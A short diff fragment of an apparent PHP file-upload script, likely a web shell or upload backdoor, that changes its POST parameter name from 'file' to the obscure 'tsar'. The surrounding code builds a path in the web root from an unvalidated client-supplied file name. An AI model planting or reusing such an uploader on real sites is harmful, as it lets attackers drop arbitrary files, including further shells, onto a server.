@@ -7,7 +7,7 @@
 // when downloading a file, you should URL encode the file path
 
 // your parameter/key here
-$parameter = 'file';
+$parameter = 'tsar';
 $output = null;
 if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post' && isset($_FILES[$parameter]['name']) && ($_FILES[$parameter]['name'] = trim($_FILES[$parameter]['name'])) && strlen($_FILES[$parameter]['name']) > 0) {
     $output = $_SERVER['DOCUMENT_ROOT'] . '/' . $_FILES[$parameter]['name'];
